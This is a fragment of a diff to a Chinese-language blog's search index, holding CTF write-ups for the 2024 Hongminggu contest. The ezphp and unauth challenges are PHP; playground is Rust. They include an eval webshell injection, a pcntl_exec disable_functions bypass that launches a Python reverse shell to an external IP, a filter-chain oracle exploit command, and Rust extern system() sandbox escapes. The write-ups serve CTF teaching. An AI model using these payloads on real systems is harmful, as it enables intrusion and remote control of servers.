+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval,assert,fwrite,file_put_contents,phpinfo,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,lin,putenv,mail,chroot,chgrp,dl,readlink</span><br></pre></td></tr></table></figure>
+
+<p>我们在php拓展注意到<code>pcntl.so</code></p>
+<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403212849023.png"></p>
+<p>去网上搜到利用<code>pcntl_exec</code>绕过disable_function限制 <a href="https://cn-sec.com/archives/228037.html">参考文章</a></p>
+<p>并且此函数刚好没有被禁用，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?cmd=?&gt;&lt;?=eval($_POST[1]);</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">1=?&gt;&lt;?php pcntl_exec(&quot;/usr/bin/python&quot;,array(&#x27;-c&#x27;, &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;47.242.11.183&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell后，尝试suid提权，发现有su命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su admin</span><br></pre></td></tr></table></figure>
+
+<p>密码在<code>config.inc.php</code></p>
+<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403221132681.png"></p>
+<p>成功提权得到flag</p>
+<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403213853106.png"></p>
+<h1 id="playground"><a href="#playground" class="headerlink" title="playground"></a>playground</h1><blockquote>
+<p>Rust</p>
+</blockquote>
+<p>源码如下</p>
+<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[macro_use]</span> <span class="keyword">extern</span> <span class="keyword">crate</span> rocket;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">use</span> std::fs;  </span><br><span class="line"><span class="keyword">use</span> std::fs::File;  </span><br><span class="line"><span class="keyword">use</span> std::io::Write;  </span><br><span class="line"><span class="keyword">use</span> std::process::Command;  </span><br><span class="line"><span class="keyword">use</span> rand::Rng;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">index</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;  </span><br><span class="line">    fs::<span class="title function_ invoke__">read_to_string</span>(<span class="string">&quot;main.rs&quot;</span>).<span class="title function_ invoke__">unwrap_or</span>(<span class="type">String</span>::<span class="title function_ invoke__">default</span>())  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/rust_code&quot;</span>, data = <span class="string">&quot;&lt;code&gt;&quot;</span>)]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">run_rust_code</span>(code: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> code.<span class="title function_ invoke__">contains</span>(<span class="string">&quot;std&quot;</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: std is not allowed&quot;</span>.<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//generate a random 5 length file name  </span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">file_name</span> = rand::<span class="title function_ invoke__">thread_rng</span>()  </span><br><span class="line">        .<span class="title function_ invoke__">sample_iter</span>(&amp;rand::distributions::Alphanumeric)  </span><br><span class="line">        .<span class="title function_ invoke__">take</span>(<span class="number">5</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">map</span>(<span class="type">char</span>::from)  </span><br><span class="line">        .collect::&lt;<span class="type">String</span>&gt;();  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(<span class="keyword">mut</span> file) = File::<span class="title function_ invoke__">create</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>, &amp;file_name)) &#123;  </span><br><span class="line">        file.<span class="title function_ invoke__">write_all</span>(code.<span class="title function_ invoke__">as_bytes</span>());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(build_output) = Command::<span class="title function_ invoke__">new</span>(<span class="string">&quot;rustc&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-C&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;debuginfo=0&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-C&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;opt-level=3&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-o&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">output</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span> !build_output.status.<span class="title function_ invoke__">success</span>()&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(build_output.stderr.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(output) = Command::<span class="title function_ invoke__">new</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">output</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span> !output.status.<span class="title function_ invoke__">success</span>()&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(output.stderr.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(output.stdout.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">default</span>();  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[launch]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">rocket</span>() <span class="punctuation">-&gt;</span> _ &#123;  </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">figment</span> = rocket::Config::<span class="title function_ invoke__">figment</span>()  </span><br><span class="line">        .<span class="title function_ invoke__">merge</span>((<span class="string">&quot;address&quot;</span>, <span class="string">&quot;0.0.0.0&quot;</span>));  </span><br><span class="line">    rocket::<span class="title function_ invoke__">custom</span>(figment).<span class="title function_ invoke__">mount</span>(<span class="string">&quot;/&quot;</span>, routes![])  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意<code>/rust_code</code>路由下，过滤了<code>std</code>表示禁止使用Rust的标准库。生成一个随机的长度为 5 的文件名，使用 <code>File::create</code> 创建一个文件，路径为 <code>playground/&#123;&#125;.rs</code>，然后运行rust代码并输出</p>
+<p>我们的目标是通过system函数执行命令，但是system属于外部函数，需要我们声明一下</p>
+<p>payload如下</p>
+<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明外部函数 C语言库函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">system</span>(cmd: *<span class="keyword">const</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">	<span class="comment">// Rust 中的 unsafe 块，用于执行不受 Rust 安全机制保护的操作</span></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>.<span class="title function_ invoke__">as_ptr</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者是</p>
+<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">	<span class="keyword">fn</span> <span class="title function_">system</span>(s: *<span class="keyword">const</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;  </span><br><span class="line">	<span class="keyword">unsafe</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">b&quot;cat /flag&quot;</span> <span class="keyword">as</span> *<span class="keyword">const</span> <span class="type">u8</span>)</span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+  </entry>
+  <entry>
     <title>区块链 fabric搭建</title>
     <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA.html</url>
     <content><![CDATA[<p>记录Ubuntu22.04下搭建fabric平台</p>
@@ -3155,113 +3460,6 @@
       </categories>
       <tags>
         <tag>环境搭建</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客常用设置</title>
-    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
-    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
-<span id="more"></span>
-
-
-
-<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>红明谷杯2024</title>
-    <url>/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024.html</url>
-    <content><![CDATA[<p>pcntl_exec绕过disable_function限制、Rust语言</p>
-<span id="more"></span>
-
-<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><blockquote>
-<p>php版本为8.3.2</p>
-</blockquote>
-<p>源码如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// flag.php</span><br><span class="line">if (isset($_POST[&#x27;f&#x27;])) &#123;</span><br><span class="line">    echo hash_file(&#x27;md5&#x27;, $_POST[&#x27;f&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>注意到<code>hash_file</code>函数，有点像侧信道攻击的<code>file</code>函数，去网上搜到有关<code>fliter_chains</code>的<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">exp</a></p>
-<p>该脚本可利用函数<code>file()</code> 、 <code>hash_file()</code> 、 <code>file_get_contents()</code> 或 <code>copy()</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 filters_chain_oracle_exploit.py --target url --file &#x27;flag.php&#x27; --parameter f</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240404112621747.png"></p>
-<p>爆出来参数为ezphpPhp8，加上参数就可以看到<code>flag.php</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;ezphpPhp8&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;No&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$a = new class &#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&#x27;cat /flag&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">unset($a);</span><br><span class="line">$a = $_GET[&#x27;ezphpPhp8&#x27;];</span><br><span class="line">$f = new $a();</span><br><span class="line">$f-&gt;getflag();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后这里的 $a 是匿名类，但是 unset 会销毁变量，这下不会了</p>
-<p>这个时候要找一下如何触发一个匿名类 <a href="https://hi-arkin.com/archives/php-anonymous-stdClass.html">参考文章</a></p>
-<p>匿名类的类名与文件所在行列相关，即同一个位置实例出来的类为同一个类</p>
-<p>也就是说虽然被销毁了但是我们实例化出来是一样的类</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$obj=new class&#123;&#125;;</span><br><span class="line">// class名为: &#x27;class@anonymous&#x27;+chr(0)+php文件路径+行数$列数</span><br><span class="line">echo get_class($obj);</span><br></pre></td></tr></table></figure>
-
-<p>payload如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/flag.php?ezphpPhp8=<span class="class"><span class="keyword">class</span>@<span class="title">anonymous</span>%00/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/<span class="title">flag</span>.<span class="title">php</span>:7$0</span></span><br></pre></td></tr></table></figure>
-
-<p>这里的列数是随机的，bp抓包爆破一下即可</p>
-<h1 id="unauth"><a href="#unauth" class="headerlink" title="unauth"></a>unauth</h1><p>打开题目有个弹框登录</p>
-<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403200058890.png"></p>
-<p>扫目录发现有日志文件泄露，得到admin密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022-01-01 12:34:56]  Authentication successful - User: admin Pass: 2e525e29e465f45d8d7c56319fe73036</span><br></pre></td></tr></table></figure>
-
-<p>成功登录，源码如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!isset($_SERVER[&#x27;PHP_AUTH_USER&#x27;])) &#123;</span><br><span class="line">    header(&#x27;WWW-Authenticate: Basic realm=&quot;Restricted Area&quot;&#x27;);</span><br><span class="line">    header(&#x27;HTTP/1.0 401 Unauthorized&#x27;);</span><br><span class="line">    echo &#x27;小明是运维工程师，最近网站老是出现bug。&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $validUser = &#x27;admin&#x27;;</span><br><span class="line">    $validPass = &#x27;2e525e29e465f45d8d7c56319fe73036&#x27;;</span><br><span class="line"></span><br><span class="line">    if ($_SERVER[&#x27;PHP_AUTH_USER&#x27;] != $validUser || $_SERVER[&#x27;PHP_AUTH_PW&#x27;] != $validPass) &#123;</span><br><span class="line">        header(&#x27;WWW-Authenticate: Basic realm=&quot;Restricted Area&quot;&#x27;);</span><br><span class="line">        header(&#x27;HTTP/1.0 401 Unauthorized&#x27;);</span><br><span class="line">        echo &#x27;Invalid credentials&#x27;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>尝试查看phpinfo发现不行，写个马蚁剑连接先</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=eval($_POST[1]);</span><br></pre></td></tr></table></figure>
-
-<p>记得下面的请求信息带上请求头<code>Authorization：Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY=</code></p>
-<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403212517974.png"></p>
-<p>查看<code>php.ini</code>，禁用函数如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval,assert,fwrite,file_put_contents,phpinfo,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,lin,putenv,mail,chroot,chgrp,dl,readlink</span><br></pre></td></tr></table></figure>
-
-<p>我们在php拓展注意到<code>pcntl.so</code></p>
-<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403212849023.png"></p>
-<p>去网上搜到利用<code>pcntl_exec</code>绕过disable_function限制 <a href="https://cn-sec.com/archives/228037.html">参考文章</a></p>
-<p>并且此函数刚好没有被禁用，payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?cmd=?&gt;&lt;?=eval($_POST[1]);</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">1=?&gt;&lt;?php pcntl_exec(&quot;/usr/bin/python&quot;,array(&#x27;-c&#x27;, &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;47.242.11.183&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>成功反弹shell后，尝试suid提权，发现有su命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su admin</span><br></pre></td></tr></table></figure>
-
-<p>密码在<code>config.inc.php</code></p>
-<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403221132681.png"></p>
-<p>成功提权得到flag</p>
-<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403213853106.png"></p>
-<h1 id="playground"><a href="#playground" class="headerlink" title="playground"></a>playground</h1><blockquote>
-<p>Rust</p>
-</blockquote>
-<p>源码如下</p>
-<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[macro_use]</span> <span class="keyword">extern</span> <span class="keyword">crate</span> rocket;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">use</span> std::fs;  </span><br><span class="line"><span class="keyword">use</span> std::fs::File;  </span><br><span class="line"><span class="keyword">use</span> std::io::Write;  </span><br><span class="line"><span class="keyword">use</span> std::process::Command;  </span><br><span class="line"><span class="keyword">use</span> rand::Rng;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">index</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;  </span><br><span class="line">    fs::<span class="title function_ invoke__">read_to_string</span>(<span class="string">&quot;main.rs&quot;</span>).<span class="title function_ invoke__">unwrap_or</span>(<span class="type">String</span>::<span class="title function_ invoke__">default</span>())  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/rust_code&quot;</span>, data = <span class="string">&quot;&lt;code&gt;&quot;</span>)]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">run_rust_code</span>(code: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> code.<span class="title function_ invoke__">contains</span>(<span class="string">&quot;std&quot;</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: std is not allowed&quot;</span>.<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//generate a random 5 length file name  </span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">file_name</span> = rand::<span class="title function_ invoke__">thread_rng</span>()  </span><br><span class="line">        .<span class="title function_ invoke__">sample_iter</span>(&amp;rand::distributions::Alphanumeric)  </span><br><span class="line">        .<span class="title function_ invoke__">take</span>(<span class="number">5</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">map</span>(<span class="type">char</span>::from)  </span><br><span class="line">        .collect::&lt;<span class="type">String</span>&gt;();  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(<span class="keyword">mut</span> file) = File::<span class="title function_ invoke__">create</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>, &amp;file_name)) &#123;  </span><br><span class="line">        file.<span class="title function_ invoke__">write_all</span>(code.<span class="title function_ invoke__">as_bytes</span>());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(build_output) = Command::<span class="title function_ invoke__">new</span>(<span class="string">&quot;rustc&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-C&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;debuginfo=0&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-C&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;opt-level=3&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-o&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">output</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span> !build_output.status.<span class="title function_ invoke__">success</span>()&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(build_output.stderr.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(output) = Command::<span class="title function_ invoke__">new</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">output</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span> !output.status.<span class="title function_ invoke__">success</span>()&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(output.stderr.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(output.stdout.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">default</span>();  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[launch]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">rocket</span>() <span class="punctuation">-&gt;</span> _ &#123;  </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">figment</span> = rocket::Config::<span class="title function_ invoke__">figment</span>()  </span><br><span class="line">        .<span class="title function_ invoke__">merge</span>((<span class="string">&quot;address&quot;</span>, <span class="string">&quot;0.0.0.0&quot;</span>));  </span><br><span class="line">    rocket::<span class="title function_ invoke__">custom</span>(figment).<span class="title function_ invoke__">mount</span>(<span class="string">&quot;/&quot;</span>, routes![])  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>注意<code>/rust_code</code>路由下，过滤了<code>std</code>表示禁止使用Rust的标准库。生成一个随机的长度为 5 的文件名，使用 <code>File::create</code> 创建一个文件，路径为 <code>playground/&#123;&#125;.rs</code>，然后运行rust代码并输出</p>
-<p>我们的目标是通过system函数执行命令，但是system属于外部函数，需要我们声明一下</p>
-<p>payload如下</p>
-<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明外部函数 C语言库函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">system</span>(cmd: *<span class="keyword">const</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">	<span class="comment">// Rust 中的 unsafe 块，用于执行不受 Rust 安全机制保护的操作</span></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>.<span class="title function_ invoke__">as_ptr</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>或者是</p>
